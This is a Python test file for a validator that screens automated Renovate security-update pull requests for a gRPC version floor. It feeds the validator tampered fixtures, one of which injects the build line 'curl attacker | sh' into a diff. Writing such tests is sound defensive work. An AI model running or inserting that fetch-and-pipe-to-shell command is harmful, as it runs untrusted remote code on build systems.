#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.13"
# dependencies = []
# ///
# How to run:
#   uv run scripts/test_validate_security_floor_pr.py

from __future__ import annotations


from validate_security_floor_pr import ValidationError, is_upgrade, validate

SHA = "6" * 40
PATCH = """@@ -1,3 +1,3 @@
 vars:
-  grpc-floor: v1.83.1  # renovate: datasource=go depName=google.golang.org/grpc
+  grpc-floor: v1.83.2  # renovate: datasource=go depName=google.golang.org/grpc
"""
DOWNGRADE_PATCH = """@@ -1,3 +1,3 @@
 vars:
-  grpc-floor: v1.83.2  # renovate: datasource=go depName=google.golang.org/grpc
+  grpc-floor: v1.83.1  # renovate: datasource=go depName=google.golang.org/grpc
"""
RELOCATED_PATCH = """@@ -1,3 +1,2 @@
 vars:
-  grpc-floor: v1.83.1  # renovate: datasource=go depName=google.golang.org/grpc
 pipeline:
@@ -20,2 +19,3 @@
   - runs: build
+  grpc-floor: v1.83.2  # renovate: datasource=go depName=google.golang.org/grpc
"""


def pull() -> dict[str, object]:
    return {
        "number": 1125,
        "state": "open",
        "draft": False,
        "title": "chore(deps): update module google.golang.org/grpc [security]",
        "body": "<!--renovate-debug:trusted-->",
        "changed_files": 1,
        "user": {"login": "renovate[bot]", "type": "Bot"},
        "base": {"ref": "main"},
        "head": {
            "ref": "renovate/go-google.golang.org-grpc-vulnerability",
            "sha": SHA,
            "repo": {"full_name": "tektum/verity-images"},
        },
        "labels": [{"name": "review-required"}, {"name": "security-floor"}],
    }


def commit() -> dict[str, object]:
    return {
        "sha": SHA,
        "author": {"login": "renovate[bot]"},
        "committer": {"login": "web-flow"},
        "commit": {
            "author": {
                "name": "renovate[bot]",
                "email": "29139614+renovate[bot]@users.noreply.github.com",
                "date": "2026-09-11T14:46:05Z",
            },
            "committer": {
                "name": "GitHub",
                "email": "noreply@github.com",
                "date": "2026-09-11T14:46:05Z",
            },
            "verification": {"verified": True, "reason": "valid"},
        },
        "parents": [{"sha": "5" * 40}],
    }


def files() -> list[dict[str, object]]:
    return [
        {
            "filename": "images/loki/melange.yaml",
            "status": "modified",
            "patch": PATCH,
        }
    ]


def rejected(mutator) -> str:
    candidate_pull = pull()
    candidate_commit = commit()
    candidate_files = files()
    mutator(candidate_pull, candidate_commit, candidate_files)
    try:
        validate(candidate_pull, candidate_commit, candidate_files)
    except ValidationError as error:
        return str(error)
    raise AssertionError("untrusted security-floor PR was accepted")


def main() -> None:
    assert validate(pull(), commit(), files()) == (1125, SHA)

    assert "author is not Renovate" in rejected(
        lambda pull, _commit, _files: pull["user"].update(login="attacker")
    )
    assert "head commit author is not Renovate" in rejected(
        lambda _pull, commit, _files: commit["author"].update(login="attacker")
    )
    assert "valid GitHub signature" in rejected(
        lambda _pull, commit, _files: commit["commit"]["verification"].update(
            verified=False
        )
    )
    assert "trusted flow" in rejected(
        lambda _pull, commit, _files: commit["committer"].update(login="human")
    )
    assert "lacks security-floor labels" in rejected(
        lambda pull, _commit, _files: pull.update(labels=[])
    )
    assert "non-Melange file" in rejected(
        lambda _pull, _commit, files: files[0].update(filename="scripts/payload.sh")
    )
    assert "Renovate annotation changed" in rejected(
        lambda _pull, _commit, files: files[0].update(
            patch=PATCH.replace("depName=google.golang.org/grpc\n", "depName=evil/module\n", 1)
        )
    )
    assert "diff block is not paired" in rejected(
        lambda _pull, _commit, files: files[0].update(
            patch=PATCH + "+  runs: curl attacker | sh\n"
        )
    )
    assert "diff block is not paired" in rejected(
        lambda _pull, _commit, files: files[0].update(patch=RELOCATED_PATCH)
    )
    assert "floor version is not an upgrade" in rejected(
        lambda _pull, _commit, files: files[0].update(patch=DOWNGRADE_PATCH)
    )
    assert "file list is incomplete" in rejected(
        lambda pull, _commit, _files: pull.update(changed_files=2)
    )
    assert is_upgrade("4.1.137.Final", "4.1.138.Final", "maven")
    assert not is_upgrade("4.1.138.Final", "4.1.137.Final", "maven")
    print("passed scripts/test_validate_security_floor_pr.py")


if __name__ == "__main__":
    main()
